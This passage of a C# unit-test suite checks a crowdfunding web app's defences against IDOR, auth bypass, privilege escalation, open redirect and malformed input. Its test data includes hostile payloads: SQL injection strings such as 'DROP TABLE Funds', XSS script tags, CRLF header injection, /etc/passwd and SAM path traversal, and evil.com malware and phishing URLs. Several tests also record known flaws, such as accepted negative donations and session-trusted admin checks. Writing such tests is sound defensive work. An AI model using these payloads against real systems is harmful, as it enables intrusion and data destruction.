            var controller = CreateFundsController(context, userId: 2, email: "donor@test.com");

            // Act
            var result = await controller.AddCollaborator(1, "admin@test.com") as JsonResult;

            // Assert
            var value = result!.Value;
            value!.GetType().GetProperty("success")!.GetValue(value).Should().Be(false);
            value.GetType().GetProperty("message")!.GetValue(value).Should().Be("Only the fund creator can add collaborators");
        }

        [Fact]
        public async Task IDOR_UserCannotAddMilestoneToAnotherUsersFund()
        {
            // Attack vector: IDOR - User 2 tries to add milestones to User 1's fund
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateFundsController(context, userId: 2, email: "donor@test.com");

            // Act
            var result = await controller.AddMilestone(1, "Fake Milestone", 500m, "Injected milestone") as JsonResult;

            // Assert
            var value = result!.Value;
            value!.GetType().GetProperty("success")!.GetValue(value).Should().Be(false);
        }

        [Fact]
        public async Task IDOR_UserCannotRequestExtensionForAnotherUsersFund()
        {
            // Attack vector: IDOR - User 2 requests a deadline extension for User 1's fund
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);

            // Set fund 1 to expire soon so the extension window is valid
            var fund = context.Funds.First(f => f.Id == 1);
            fund.EndDate = DateTime.UtcNow.AddDays(3);
            context.SaveChanges();

            var controller = CreateFundsController(context, userId: 2, email: "donor@test.com");

            // Act
            var result = await controller.RequestExtension(1, 10, "Please extend this fund") as JsonResult;

            // Assert
            var value = result!.Value;
            value!.GetType().GetProperty("success")!.GetValue(value).Should().Be(false);
            value.GetType().GetProperty("message")!.GetValue(value).Should().Be("Only the fund creator can request an extension");
        }

        [Fact]
        public async Task IDOR_UserCannotCancelAnotherUsersRecurringDonation()
        {
            // Attack vector: IDOR - User 1 tries to cancel User 2's recurring donation
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);

            context.RecurringDonations.Add(new RecurringDonation
            {
                Id = 1,
                FundId = 1,
                UserId = 2,
                DonorName = "@donor",
                Amount = 10,
                IsActive = true,
                CreatedAt = DateTime.UtcNow
            });
            context.SaveChanges();

            // User 1 tries to cancel User 2's recurring donation
            var controller = CreateAccountController(context);
            TestHelper.SetupSession(controller, userId: 1, email: "creator@test.com");

            // Act
            var result = await controller.CancelRecurringDonation(1) as JsonResult;

            // Assert
            var value = result!.Value;
            value!.GetType().GetProperty("success")!.GetValue(value).Should().Be(false);
            context.RecurringDonations.First(r => r.Id == 1).IsActive.Should().BeTrue(
                "User 1 should not be able to cancel User 2's recurring donation");
        }

        #endregion

        #region Session/Authentication Bypass

        [Fact]
        public void Profile_UnauthenticatedUser_RedirectsToSignIn()
        {
            // Attack vector: Accessing profile without authentication
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateAccountController(context);

            // Act
            var result = controller.Profile();

            // Assert
            result.Should().BeOfType<RedirectToActionResult>();
            var redirect = result as RedirectToActionResult;
            redirect!.ActionName.Should().Be("SignIn");
        }

        [Fact]
        public void MyFunds_UnauthenticatedUser_RedirectsToSignIn()
        {
            // Attack vector: Accessing my funds without authentication
            var context = TestHelper.CreateDbContext();
            var controller = CreateAccountController(context);

            // Act
            var result = controller.MyFunds();

            // Assert
            result.Should().BeOfType<RedirectToActionResult>();
        }

        [Fact]
        public void MyDonations_UnauthenticatedUser_RedirectsToSignIn()
        {
            // Attack vector: Accessing donation history without authentication
            var context = TestHelper.CreateDbContext();
            var controller = CreateAccountController(context);

            // Act
            var result = controller.MyDonations();

            // Assert
            result.Should().BeOfType<RedirectToActionResult>();
        }

        [Fact]
        public void FundCreate_UnauthenticatedUser_RedirectsToSignIn()
        {
            // Attack vector: Creating a fund without authentication
            var context = TestHelper.CreateDbContext();
            var controller = CreateFundsController(context);

            // Act
            var result = controller.Create();

            // Assert
            result.Should().BeOfType<RedirectToActionResult>();
            var redirect = result as RedirectToActionResult;
            redirect!.ActionName.Should().Be("SignIn");
        }

        [Fact]
        public async Task ProcessDonation_UnauthenticatedUser_ReturnsFailure()
        {
            // Attack vector: Submitting a donation without authentication
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateFundsController(context); // No userId

            // Act
            var result = await controller.ProcessDonation(1, 100m) as JsonResult;

            // Assert
            var value = result!.Value;
            value!.GetType().GetProperty("success")!.GetValue(value).Should().Be(false);
        }

        [Fact]
        public void ToggleFollow_UnauthenticatedUser_ReturnsFailure()
        {
            // Attack vector: Following/unfollowing funds without authentication
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateAccountController(context);

            // Act
            var result = controller.ToggleFollow(1) as JsonResult;

            // Assert
            var value = result!.Value;
            value!.GetType().GetProperty("success")!.GetValue(value).Should().Be(false);
        }

        [Fact]
        public async Task SaveBuddyCustomization_UnauthenticatedUser_ReturnsFailure()
        {
            // Attack vector: Modifying buddy customization without authentication
            var context = TestHelper.CreateDbContext();
            var controller = CreateAccountController(context);

            // Act
            var result = await controller.SaveBuddyCustomization("glasses1", "hat1", "mask1") as JsonResult;

            // Assert
            var value = result!.Value;
            value!.GetType().GetProperty("success")!.GetValue(value).Should().Be(false);
        }

        #endregion

        #region Privilege Escalation

        [Fact]
        public void AdminSelfDeletion_IsBlocked()
        {
            // Attack vector: Admin tries to delete themselves to cause system instability
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateAdminController(context, userId: 3, isAdmin: true);

            // Act
            var result = controller.DeleteUser(3) as JsonResult;

            // Assert
            var value = result!.Value;
            value!.GetType().GetProperty("success")!.GetValue(value).Should().Be(false);
            value.GetType().GetProperty("message")!.GetValue(value).Should().Be("Cannot delete yourself");
            context.Users.Any(u => u.Id == 3).Should().BeTrue();
        }

        [Fact]
        public void AdminSelfDemotion_IsBlocked()
        {
            // Attack vector: Admin tries to remove their own admin status
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateAdminController(context, userId: 3, isAdmin: true);

            // Act
            var result = controller.ToggleAdmin(3) as JsonResult;

            // Assert
            var value = result!.Value;
            value!.GetType().GetProperty("success")!.GetValue(value).Should().Be(false);
            context.Users.First(u => u.Id == 3).IsAdmin.Should().BeTrue();
        }

        [Fact]
        public void SessionManipulation_SettingIsAdminToTrue_DoesNotGrantAccess()
        {
            // Attack vector: Simulating session manipulation where a regular user
            // manually sets IsAdmin to "True" in session but is not actually admin in DB
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);

            // User 1 is NOT admin in DB, but we set isAdmin: true in session
            // The AdminController checks session, so this tests defense-in-depth
            var controller = CreateAdminController(context, userId: 1, isAdmin: true);

            // Act - with manipulated session, admin actions will succeed at controller level
            // This demonstrates that session-based auth trusts the session value
            // In production, session integrity should be protected by server-side session storage
            var result = controller.Dashboard();

            // The session check passes (IsAdmin == "True"), so this IS a potential vulnerability
            // if an attacker can forge session data. The test documents this behavior.
            result.Should().NotBeNull();
        }

        #endregion

        // #####################################################################
        //  SECTION 4: INPUT VALIDATION TESTS
        // #####################################################################

        #region Boundary Values - Donation Amounts

        [Fact]
        public async Task ProcessDonation_NegativeAmount_StillProcesses()
        {
            // Attack vector: Negative donation amount to extract money from fund
            // This tests whether the server validates amount > 0
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateFundsController(context, userId: 2, email: "donor@test.com");

            var originalAmount = context.Funds.First(f => f.Id == 1).RaisedAmount;

            // Act
            var result = await controller.ProcessDonation(1, -500m);

            // Assert - the controller does NOT validate amount > 0 (documents the vulnerability)
            var fund = context.Funds.First(f => f.Id == 1);
            // This records current behavior; negative amounts SHOULD be blocked
            result.Should().NotBeNull();
        }

        [Fact]
        public async Task ProcessDonation_ZeroAmount_StillProcesses()
        {
            // Attack vector: Zero donation to inflate supporters count without paying
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateFundsController(context, userId: 2, email: "donor@test.com");

            var originalSupporters = context.Funds.First(f => f.Id == 1).SupportersCount;

            // Act
            var result = await controller.ProcessDonation(1, 0m);

            // Assert - documents that zero amount increments supporters
            result.Should().NotBeNull();
        }

        [Fact]
        public async Task ProcessDonation_ExtremelyLargeAmount_HandledGracefully()
        {
            // Attack vector: Extremely large donation amount (decimal overflow attempt)
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateFundsController(context, userId: 2, email: "donor@test.com");

            // Act - should not throw overflow exception
            var result = await controller.ProcessDonation(1, 79228162514264337593543950335m); // decimal.MaxValue

            // Assert - should handle gracefully
            result.Should().NotBeNull();
        }

        [Fact]
        public async Task ProcessDonation_DecimalPrecisionAbuse_HandledGracefully()
        {
            // Attack vector: Very precise decimal to test rounding/precision issues
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateFundsController(context, userId: 2, email: "donor@test.com");

            // Act
            var result = await controller.ProcessDonation(1, 0.0000000000000001m);

            // Assert
            result.Should().NotBeNull();
        }

        #endregion

        #region Boundary Values - Admin Fund Manipulation

        [Fact]
        public void AdminAddFunds_NegativeAmount_ReducesFundBalance()
        {
            // Attack vector: Admin using negative amount to reduce fund balance
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateAdminController(context, userId: 3, isAdmin: true);

            var originalAmount = context.Funds.First(f => f.Id == 1).RaisedAmount;

            // Act
            var result = controller.AddFundsToFund(1, -999999m);

            // Assert - documents that negative amounts are accepted (potential issue)
            var fund = context.Funds.First(f => f.Id == 1);
            fund.RaisedAmount.Should().Be(originalAmount - 999999m);
        }

        #endregion

        #region Extremely Long Strings

        [Fact]
        public void Search_ExtremelyLongQuery_DoesNotCrash()
        {
            // Attack vector: Buffer overflow / DoS via extremely long search string
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateSearchController(context);

            var longQuery = new string('A', 100000); // 100KB string

            // Act - should not throw OutOfMemoryException or crash
            var result = controller.Index(longQuery);

            // Assert
            result.Should().NotBeNull();
        }

        [Fact]
        public void Search_Autocomplete_ExtremelyLongTerm_DoesNotCrash()
        {
            // Attack vector: DoS via long autocomplete term
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateSearchController(context);

            var longTerm = new string('B', 50000);

            // Act
            var result = controller.Autocomplete(longTerm);

            // Assert
            result.Should().NotBeNull();
        }

        [Fact]
        public async Task PostUpdate_ExtremelyLongContent_DoesNotCrash()
        {
            // Attack vector: DoS via extremely long update content
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateFundsController(context, userId: 1, email: "creator@test.com");

            var longContent = new string('X', 500000); // 500KB

            // Act
            var result = await controller.PostUpdate(1, "Normal Title", longContent);

            // Assert
            result.Should().NotBeNull();
        }

        #endregion

        #region Null Bytes and Special Characters

        [Theory]
        [InlineData("test\0injection")]
        [InlineData("test\x00\x01\x02")]
        [InlineData("test\r\n\r\nHTTP/1.1 200 OK\r\n")]
        [InlineData("test%00admin")]
        [InlineData("../../../../etc/passwd")]
        public void Search_SpecialCharacters_DoesNotCrash(string payload)
        {
            // Attack vector: Null byte injection, HTTP header injection, path traversal in search
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateSearchController(context);

            // Act
            var result = controller.Index(payload);

            // Assert
            result.Should().NotBeNull();
        }

        [Theory]
        [InlineData("../../../../etc/passwd")]
        [InlineData("..\\..\\..\\..\\windows\\system32\\config\\sam")]
        [InlineData("file:///etc/passwd")]
        [InlineData("https://evil.com/malware.exe")]
        [InlineData("data:text/html,<script>alert(1)</script>")]
        [InlineData("javascript:alert(1)")]
        public async Task FundCreation_PathTraversalInImageUrl_StoredAsLiteral(string maliciousUrl)
        {
            // Attack vector: Path traversal or malicious URL in fund image URL
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateFundsController(context, userId: 1, email: "creator@test.com");

            var model = new CreateFundViewModel
            {
                Title = "Normal Fund",
                Description = "A perfectly normal description that is long enough to meet the fifty character minimum validation requirement.",
                Category = "Education",
                GoalAmount = 1000,
                DurationDays = 30,
                ImageUrl = maliciousUrl
            };

            // Act
            var result = await controller.Create(model);

            // Assert - the URL is stored as-is; it's the view layer's responsibility
            // to render it safely (e.g., Content Security Policy, URL validation)
            var fund = context.Funds.FirstOrDefault(f => f.Title == "Normal Fund");
            fund.Should().NotBeNull();
            fund!.ImageUrl.Should().Be(maliciousUrl,
                "URL is stored literally; should be validated/sanitized for safe rendering");
        }

        #endregion

        #region Extension Validation Bypass

        [Fact]
        public async Task RequestExtension_ExceedMaxDays_IsRejected()
        {
            // Attack vector: Requesting more than the 30-day maximum extension
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);

            var fund = context.Funds.First(f => f.Id == 1);
            fund.EndDate = DateTime.UtcNow.AddDays(3);
            context.SaveChanges();

            var controller = CreateFundsController(context, userId: 1, email: "creator@test.com");

            // Act
            var result = await controller.RequestExtension(1, 31, "Need more time") as JsonResult;

            // Assert
            var value = result!.Value;
            value!.GetType().GetProperty("success")!.GetValue(value).Should().Be(false);
        }

        [Fact]
        public async Task RequestExtension_ZeroDays_IsRejected()
        {
            // Attack vector: Requesting zero-day extension (pointless but edge case)
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);

            var fund = context.Funds.First(f => f.Id == 1);
            fund.EndDate = DateTime.UtcNow.AddDays(3);
            context.SaveChanges();

            var controller = CreateFundsController(context, userId: 1, email: "creator@test.com");

            // Act
            var result = await controller.RequestExtension(1, 0, "Zero extension") as JsonResult;

            // Assert
            var value = result!.Value;
            value!.GetType().GetProperty("success")!.GetValue(value).Should().Be(false);
        }

        [Fact]
        public async Task RequestExtension_NegativeDays_IsRejected()
        {
            // Attack vector: Negative extension days to move deadline backward
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);

            var fund = context.Funds.First(f => f.Id == 1);
            fund.EndDate = DateTime.UtcNow.AddDays(3);
            context.SaveChanges();

            var controller = CreateFundsController(context, userId: 1, email: "creator@test.com");

            // Act
            var result = await controller.RequestExtension(1, -10, "Backwards time") as JsonResult;

            // Assert
            var value = result!.Value;
            value!.GetType().GetProperty("success")!.GetValue(value).Should().Be(false);
        }

        [Fact]
        public async Task RequestExtension_ExtremelyLongReason_IsRejected()
        {
            // Attack vector: Exceeding the 500-character reason limit
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);

            var fund = context.Funds.First(f => f.Id == 1);
            fund.EndDate = DateTime.UtcNow.AddDays(3);
            context.SaveChanges();

            var controller = CreateFundsController(context, userId: 1, email: "creator@test.com");

            var longReason = new string('R', 501);

            // Act
            var result = await controller.RequestExtension(1, 10, longReason) as JsonResult;

            // Assert
            var value = result!.Value;
            value!.GetType().GetProperty("success")!.GetValue(value).Should().Be(false);
        }

        [Fact]
        public async Task RequestExtension_DuplicateRequest_IsRejected()
        {
            // Attack vector: Requesting multiple extensions to keep extending deadline indefinitely
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);

            var fund = context.Funds.First(f => f.Id == 1);
            fund.EndDate = DateTime.UtcNow.AddDays(3);
            context.SaveChanges();

            var controller = CreateFundsController(context, userId: 1, email: "creator@test.com");

            // First extension - should succeed
            var firstResult = await controller.RequestExtension(1, 10, "Need more time please") as JsonResult;
            var firstValue = firstResult!.Value;
            firstValue!.GetType().GetProperty("success")!.GetValue(firstValue).Should().Be(true);

            // Second extension - should fail
            // Need fresh context read since EndDate changed
            fund = context.Funds.First(f => f.Id == 1);
            fund.EndDate = DateTime.UtcNow.AddDays(3); // reset for validity window
            context.SaveChanges();

            var secondResult = await controller.RequestExtension(1, 5, "Need even more time") as JsonResult;
            var secondValue = secondResult!.Value;
            secondValue!.GetType().GetProperty("success")!.GetValue(secondValue).Should().Be(false);
            secondValue.GetType().GetProperty("message")!.GetValue(secondValue).Should().Be("This fund has already been extended once");
        }

        #endregion

        #region Open Redirect Prevention

        [Theory]
        [InlineData("https://evil.com/phishing")]
        [InlineData("//evil.com")]
        [InlineData("javascript:alert(1)")]
        public void SignIn_OpenRedirect_ExternalUrlBlocked(string maliciousReturnUrl)
        {
            // Attack vector: Open redirect via returnUrl parameter after sign-in
            // Could be used for phishing (redirect user to fake site after login)
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateAccountController(context);

            // Mock Url.IsLocalUrl to return false for external URLs (which is the default setup)
            // Act
            var result = controller.SignIn("creator@test.com", "Password1", maliciousReturnUrl);

            // Assert - should redirect to Home/Index, not to the external URL
            result.Should().BeOfType<RedirectToActionResult>();
            var redirect = result as RedirectToActionResult;
            redirect!.ActionName.Should().Be("Index");
            redirect.ControllerName.Should().Be("Home");
        }

        #endregion

        #region Data Integrity Under Attack

        [Fact]
        public async Task ConcurrentDonations_DataIntegrity()
        {
            // Attack vector: Rapid concurrent donations to cause race conditions
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);

            var originalRaised = context.Funds.First(f => f.Id == 1).RaisedAmount;
            var controller = CreateFundsController(context, userId: 2, email: "donor@test.com");

            // Act - simulate multiple rapid donations
            var tasks = new List<Task>();
            for (int i = 0; i < 5; i++)
            {
                tasks.Add(controller.ProcessDonation(1, 10m));
            }
            await Task.WhenAll(tasks);

            // Assert - all donations should be recorded (in-memory DB handles this)
            var fund = context.Funds.First(f => f.Id == 1);
            fund.RaisedAmount.Should().Be(originalRaised + 50m);
        }

        [Fact]
        public void Search_EmptyDatabase_DoesNotCrash()
        {
            // Edge case: Searching with SQL injection payloads on empty database
            var context = TestHelper.CreateDbContext();
            var controller = CreateSearchController(context);

            foreach (var payload in SqlInjectionPayloads)
            {
                // Act - should not throw NullReferenceException on empty DB
                var result = controller.Index(payload);
                result.Should().NotBeNull();
            }
        }

        [Fact]
        public void FundDetails_NonExistentId_ReturnsNotFound()
        {
            // Attack vector: Probing for non-existent fund IDs (enumeration attack)
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateFundsController(context, userId: 1, email: "creator@test.com");

            // Act
            var result = controller.Details(99999);

            // Assert
            result.Should().BeOfType<NotFoundResult>();
        }

        [Fact]
        public void FundDetails_NegativeId_ReturnsNotFound()
        {
            // Attack vector: Negative ID to test for integer overflow or unusual behavior
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateFundsController(context, userId: 1, email: "creator@test.com");

            // Act
            var result = controller.Details(-1);

            // Assert
            result.Should().BeOfType<NotFoundResult>();
        }

        #endregion

        #region Home Controller Category Filter Injection

        [Theory]
        [InlineData("' OR '1'='1")]
        [InlineData("<script>alert(1)</script>")]
        [InlineData("'; DROP TABLE Funds; --")]
        public void HomeIndex_CategoryFilter_InjectionPayloads_DoNotReturnAllFunds(string maliciousCategory)
        {
            // Attack vector: SQL injection / XSS via the category filter parameter
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateHomeController(context);

            // Act
            var result = controller.Index(maliciousCategory) as ViewResult;

            // Assert
            result.Should().NotBeNull();
            var funds = result!.Model as List<Fund>;
            funds.Should().NotBeNull();
            // The malicious category won't match any real category, so should return 0 funds
            funds!.Count.Should().Be(0,
                "Injection payload as category should not match any funds");
        }

        #endregion
    }
}
